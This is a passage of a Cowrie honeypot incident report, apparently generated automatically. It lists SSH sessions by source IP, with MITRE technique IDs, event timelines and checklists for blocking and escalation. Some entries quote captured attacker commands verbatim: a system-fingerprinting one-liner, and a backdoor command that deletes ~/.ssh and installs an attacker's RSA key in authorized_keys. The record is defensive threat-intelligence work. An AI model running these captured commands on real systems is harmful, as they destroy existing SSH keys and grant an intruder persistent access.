| `2026-07-26 10:25:05` | `cowrie.login.success` |
| `2026-07-26 10:25:08` | `cowrie.session.params` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.success` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:08` | `cowrie.command.input` |
| `2026-07-26 10:25:10` | `cowrie.log.closed` |
| `2026-07-26 10:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36468f8f5ec3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 10:27 |
| **Last Seen** | 2026-07-26 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:27:48` | `cowrie.session.connect` |
| `2026-07-26 10:27:48` | `cowrie.client.version` |
| `2026-07-26 10:27:48` | `cowrie.client.kex` |
| `2026-07-26 10:27:48` | `cowrie.login.success` |
| `2026-07-26 10:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba20986bd92

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 10:27 |
| **Last Seen** | 2026-07-26 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:27:48` | `cowrie.session.connect` |
| `2026-07-26 10:27:48` | `cowrie.client.version` |
| `2026-07-26 10:27:48` | `cowrie.client.kex` |
| `2026-07-26 10:27:48` | `cowrie.login.success` |
| `2026-07-26 10:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e59aea69bf71

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 10:27 |
| **Last Seen** | 2026-07-26 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:27:51` | `cowrie.session.connect` |
| `2026-07-26 10:27:51` | `cowrie.client.version` |
| `2026-07-26 10:27:51` | `cowrie.client.kex` |
| `2026-07-26 10:27:51` | `cowrie.login.success` |
| `2026-07-26 10:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57457bbe28ee

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 10:27 |
| **Last Seen** | 2026-07-26 10:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:27:51` | `cowrie.session.connect` |
| `2026-07-26 10:27:51` | `cowrie.client.version` |
| `2026-07-26 10:27:51` | `cowrie.client.kex` |
| `2026-07-26 10:27:51` | `cowrie.login.success` |
| `2026-07-26 10:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf58ce62bd4b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:28 |
| **Last Seen** | 2026-07-26 10:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:28:04` | `cowrie.session.connect` |
| `2026-07-26 10:28:05` | `cowrie.client.version` |
| `2026-07-26 10:28:05` | `cowrie.client.kex` |
| `2026-07-26 10:28:10` | `cowrie.login.success` |
| `2026-07-26 10:28:13` | `cowrie.session.params` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.success` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:13` | `cowrie.command.input` |
| `2026-07-26 10:28:14` | `cowrie.log.closed` |
| `2026-07-26 10:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970c567903c9

| Field | Detail |
|---|---|
| **Source IP** | `103.250.11[.]156` |
| **First Seen** | 2026-07-26 10:29 |
| **Last Seen** | 2026-07-26 10:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:29:18` | `cowrie.session.connect` |
| `2026-07-26 10:29:18` | `cowrie.client.version` |
| `2026-07-26 10:29:18` | `cowrie.client.kex` |
| `2026-07-26 10:29:19` | `cowrie.login.success` |
| `2026-07-26 10:29:20` | `cowrie.session.params` |
| `2026-07-26 10:29:20` | `cowrie.command.input` |
| `2026-07-26 10:29:20` | `cowrie.command.failed` |
| `2026-07-26 10:29:21` | `cowrie.log.closed` |
| `2026-07-26 10:29:22` | `cowrie.session.params` |
| `2026-07-26 10:29:22` | `cowrie.command.input` |
| `2026-07-26 10:29:22` | `cowrie.session.file_download` |
| `2026-07-26 10:29:22` | `cowrie.log.closed` |
| `2026-07-26 10:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.11[.]156` to AbuseIPDB if not already reported
- [ ] Block `103.250.11[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ab3cd9f0eb

| Field | Detail |
|---|---|
| **Source IP** | `103.250.11[.]156` |
| **First Seen** | 2026-07-26 10:29 |
| **Last Seen** | 2026-07-26 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:29:22` | `cowrie.session.connect` |
| `2026-07-26 10:29:22` | `cowrie.client.version` |
| `2026-07-26 10:29:22` | `cowrie.client.kex` |
| `2026-07-26 10:29:23` | `cowrie.login.success` |
| `2026-07-26 10:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.11[.]156` to AbuseIPDB if not already reported
- [ ] Block `103.250.11[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76602c4f281c

| Field | Detail |
|---|---|
| **Source IP** | `103.250.11[.]156` |
| **First Seen** | 2026-07-26 10:29 |
| **Last Seen** | 2026-07-26 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:29:24` | `cowrie.session.connect` |
| `2026-07-26 10:29:24` | `cowrie.client.version` |
| `2026-07-26 10:29:24` | `cowrie.client.kex` |
| `2026-07-26 10:29:25` | `cowrie.login.success` |
| `2026-07-26 10:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.11[.]156` to AbuseIPDB if not already reported
- [ ] Block `103.250.11[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7e6cd940ef

| Field | Detail |
|---|---|
| **Source IP** | `180.113.57[.]10` |
| **First Seen** | 2026-07-26 10:30 |
| **Last Seen** | 2026-07-26 10:35 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:30:21` | `cowrie.session.connect` |
| `2026-07-26 10:30:22` | `cowrie.client.version` |
| `2026-07-26 10:30:22` | `cowrie.client.kex` |
| `2026-07-26 10:30:23` | `cowrie.login.success` |
| `2026-07-26 10:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.113.57[.]10` to AbuseIPDB if not already reported
- [ ] Block `180.113.57[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5be1e7427b4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:31 |
| **Last Seen** | 2026-07-26 10:31 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:31:04` | `cowrie.session.connect` |
| `2026-07-26 10:31:05` | `cowrie.client.version` |
| `2026-07-26 10:31:05` | `cowrie.client.kex` |
| `2026-07-26 10:31:11` | `cowrie.login.success` |
| `2026-07-26 10:31:16` | `cowrie.session.params` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.success` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:16` | `cowrie.command.input` |
| `2026-07-26 10:31:17` | `cowrie.log.closed` |
| `2026-07-26 10:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-175e814ec9e3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:34 |
| **Last Seen** | 2026-07-26 10:34 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:34:10` | `cowrie.session.connect` |
| `2026-07-26 10:34:11` | `cowrie.client.version` |
| `2026-07-26 10:34:11` | `cowrie.client.kex` |
| `2026-07-26 10:34:18` | `cowrie.login.success` |
| `2026-07-26 10:34:23` | `cowrie.session.params` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.success` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:23` | `cowrie.command.input` |
| `2026-07-26 10:34:24` | `cowrie.log.closed` |
| `2026-07-26 10:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa7ff4d96db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:37 |
| **Last Seen** | 2026-07-26 10:37 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:37:19` | `cowrie.session.connect` |
| `2026-07-26 10:37:19` | `cowrie.client.version` |
| `2026-07-26 10:37:19` | `cowrie.client.kex` |
| `2026-07-26 10:37:25` | `cowrie.login.success` |
| `2026-07-26 10:37:32` | `cowrie.session.params` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.success` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:32` | `cowrie.command.input` |
| `2026-07-26 10:37:36` | `cowrie.log.closed` |
| `2026-07-26 10:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-721a30a5ab7e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:40 |
| **Last Seen** | 2026-07-26 10:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:40:11` | `cowrie.session.connect` |
| `2026-07-26 10:40:14` | `cowrie.client.version` |
| `2026-07-26 10:40:14` | `cowrie.client.kex` |
| `2026-07-26 10:40:18` | `cowrie.login.success` |
| `2026-07-26 10:40:22` | `cowrie.session.params` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.success` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:22` | `cowrie.command.input` |
| `2026-07-26 10:40:23` | `cowrie.log.closed` |
| `2026-07-26 10:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-424cbddd0014

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-07-26 10:41 |
| **Last Seen** | 2026-07-26 10:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:41:58` | `cowrie.session.connect` |
| `2026-07-26 10:41:59` | `cowrie.client.version` |
| `2026-07-26 10:41:59` | `cowrie.client.kex` |
| `2026-07-26 10:42:03` | `cowrie.login.success` |
| `2026-07-26 10:42:04` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85476370168c

| Field | Detail |
|---|---|
| **Source IP** | `220.161.52[.]149` |
| **First Seen** | 2026-07-26 10:42 |
| **Last Seen** | 2026-07-26 10:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:42:10` | `cowrie.session.connect` |
| `2026-07-26 10:42:12` | `cowrie.client.version` |
| `2026-07-26 10:42:12` | `cowrie.client.kex` |
| `2026-07-26 10:42:15` | `cowrie.login.success` |
| `2026-07-26 10:42:16` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.161.52[.]149` to AbuseIPDB if not already reported
- [ ] Block `220.161.52[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64aa7fb9c56d

| Field | Detail |
|---|---|
| **Source IP** | `116.114.94[.]242` |
| **First Seen** | 2026-07-26 10:42 |
| **Last Seen** | 2026-07-26 10:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:42:25` | `cowrie.session.connect` |
| `2026-07-26 10:42:26` | `cowrie.client.version` |
| `2026-07-26 10:42:26` | `cowrie.client.kex` |
| `2026-07-26 10:42:27` | `cowrie.login.success` |
| `2026-07-26 10:42:29` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `116.114.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1ea407827a

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-26 10:45 |
| **Last Seen** | 2026-07-26 10:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:45:25` | `cowrie.session.connect` |
| `2026-07-26 10:45:26` | `cowrie.client.version` |
| `2026-07-26 10:45:26` | `cowrie.client.kex` |
| `2026-07-26 10:45:27` | `cowrie.login.success` |
| `2026-07-26 10:45:27` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c252bb06fd4

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-07-26 10:45 |
| **Last Seen** | 2026-07-26 10:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:45:32` | `cowrie.session.connect` |
| `2026-07-26 10:45:33` | `cowrie.client.version` |
| `2026-07-26 10:45:33` | `cowrie.client.kex` |
| `2026-07-26 10:45:35` | `cowrie.login.success` |
| `2026-07-26 10:45:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de3724b44c9b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-07-26 10:46 |
| **Last Seen** | 2026-07-26 10:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:46:46` | `cowrie.session.connect` |
| `2026-07-26 10:46:47` | `cowrie.client.version` |
| `2026-07-26 10:46:47` | `cowrie.client.kex` |
| `2026-07-26 10:46:48` | `cowrie.login.success` |
| `2026-07-26 10:46:49` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-536bb0a1440c

| Field | Detail |
|---|---|
| **Source IP** | `36.64.33[.]82` |
| **First Seen** | 2026-07-26 10:46 |
| **Last Seen** | 2026-07-26 10:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:46:54` | `cowrie.session.connect` |
